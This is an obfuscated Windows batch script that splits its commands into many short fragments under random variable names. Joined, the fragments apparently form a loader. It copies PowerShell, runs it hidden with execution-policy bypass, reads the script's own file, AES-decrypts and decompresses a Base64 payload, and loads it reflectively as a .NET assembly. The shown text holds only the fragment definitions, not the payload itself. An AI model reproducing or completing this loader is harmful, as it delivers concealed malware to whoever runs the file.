@echo off
set "GhzQVtlHHF=nd"
set "cRKgATAjYt=rs"
set "HAlSkprWmr=Wi"
set "QqiSkPcepX=he"
set "RtFjVStVVV= /"
set "ekEEgEINCy=y "
set "sHOldYeflO=\v"
set "zBNuYVxDpj=ll"
set "oXtjItLUyU=in"
set "YEVkbcjVGM=he"
set "aOPUlSuNsN=we"
set "WoZYSgLMxB=ow"
set "lUiVobzShV=rS"
set "LFdSovTFSi=1."
set "pkvwYYMAHY=do"
set "ZkFKjseUBg=Sy"
set "PgWoKsBnad=st"
set "IyhFnKhNXs=0\"
set "PyeiWcfbNs=co"
set "DWDYCrPJhd=po"
set "KwjXCTVYlY=py"
set "zDKwAbODTH=:\"
set "SmazQlylNm=Po"
set "qvmxBqgRcP= C"
set "YeKRbUxVgC=we"
set "GjyOkEOpEt=ll"
set "mlHuqMlxyJ=.e"
set "DFyKmodUye=em"
set "cQkqLXvQTY=\W"
set "ereErQktml=s\"
set "KnxAbNvhZo=ws"
set "iRuvGMIoPA=32"
set "RGLOmIWRGl=xe"
set "XipweQdtJQ= %~dp0"
set "GAKogGvEdJ=cd"
set "iWaTCflXsm=($ZW"
set "dulcnuNjry=pose"
set "KMGpwGvOvq=comp"
set "fYtmNzAafj=th('"
set "YQOgEvvQqr=.Cop"
set "iRSBQYfhxm= = N"
set "qaFUTNHOSp=BC;$"
set "kbJfRTVeXM=Jp, "
set "ArOPprxpPl=('%~f0'"
set "QnSqZXrIuV=saBm"
set "OmFtHPRiqL=ck($"
set "fKLOGAKDge=ose("
set "qkdWArSthv=)) {"
set "xnZZzyWSYY=.Ass"
set "IeVxItCONq=;$Fo"
set "NZMyrzTeeE= [Sy"
set "kfohNCPoFI=Obje"
set "UkPiYVrnjY=Obje"
set "UZhagFVBBO=join"
set "lNrBCxvVvq=gKPm"
set "lSFSfwLABo=::De"
set "mdvSNxEMtC=rity"
set "xHyyDUcztc=.Len"
set "bHHCVpheqO=)($L"
set "jZIWjSzTZE=]::("
set "dyrCVdpolq=bypa"
set "jAPZTLwDnV=PKCS"
set "BbAOhsNJaw=rofi"
set "bYLUelHvqw=pose"
set "xXAFrzFPzc=Syst"
set "sAevbUSTpx=sGUc"
set "dGoHvGMmKo=ct S"
set "zeVoRFgPSH=ewLi"
set "QYmSHTxSpP=m(, "
set "BhJgFTBwyO=[IO."
set "GMOiVoqTxR=736u"
set "bHSRnnLZYZ=1] -"
set "ZhNBWCfnGL=Snb."
set "NMHzYeEwSo=)($d"
set "HYdJmXQfYA= = $"
set "JFHiFguHpR=..-1"
set "VYBRXJICfy=urit"
set "DHSneAfctE=();$"
set "cciWXUBqWX='gni"
set "hoBtwcEjlQ=tem."
set "nsiRnJupWa=QJ ="
set "HgJaoXdZwF=S46e"
set "UqOvfbrAWx=Disp"
set "VMXUonZGwv=ptog"
set "KVQjkiaaGF=am;$"
set "HQxPCOAGPo=ress"
set "SDTfyLQWny= '')"
set "TgHxKflqbe=FoAJ"
set "mCbIvnyFuw=LHOV"
set "JQSAtkIXEs=ew-O"
set "VYdimlkjqL=bstr"
set "LYgebioQaX=3); "
set "EvzpfwHSIc=-ep "
set "ekVrjytvei=ddin"
set "ecyqGPcuyB=-joi"
set "nvmCCCjhzY=ert]"
set "ETOXduyaTM=g = "
set "ixPQGSvrPY=  $d"
set "bLoWwUgplX== [S"
set "OvnJedzcUP=yste"
set "TptTpImyFw=QJ);"
set "DNXlOZJNgK=;$Bg"
set "dAelbxYWxQ=em.I"
set "zEEUYaAOpL=0O+g"
set "WcEaGrRSah=TllA"
set "mtEGVRJAWi=ateD"
set "vIPcoPTnCi=se()"
set "dOxWCXqUPI=UOk "
set "jGIjIodhFF=bjec"
set "iWmGzUUwMw= = $"
set "WpQzpCSjhx=('da"
set "qpHsQZsRfV=Gmq "
set "voCIgBBbdt=Snb "
set "rXCUlxJzBr=fore"
set "LTmvWOatfc=Svxs"
set "wKcGxOJgXt=ddin"
set "tiQinKUcTZ=vxsm"
set "reiEzWkCBm=V = "
set "lSfBZyONtC=lit("
set "yrMskksPNx=16] "
set "VGnBcMAdqf=in $"
set "lOUKGQvUqZ=MneX"
set "cStSSoSnib=[Sys"
set "aPmeTbpSBH=n ''"
set "XpXduBglKr=null"
set "SPdLSLfggp=..-1"
set "oWtGplGBZh=em.C"
set "uBfzXsbrra=nirt"
set "CWOwWgmpbP=v4Ir"
set "JLCNKdTMLL=join"
set "WOvmLyyOHq=nage"
set "LVbYtRElJr=and "
set "pTOBSgJPAa=.-16"
set "xtBaVqVLzN=N) {"
set "MVoeifBkIK=comm"
set "maRWfEpjDf=isfL"
set "ZBBWnhlTet=LHOV"
set "QeDsRMMOVT=stem"
set "ajsiraoTEH=1..-"
set "KUVOIxJlTu=esFX"
set "vFoWxBCOiU=Secu"
set "uDarmSEoAz=sm.I"
set "eWdGvwgykA=);$z"
set "KsGGyFlKBi===')"
set "BYDIbBGSjE=-4] "
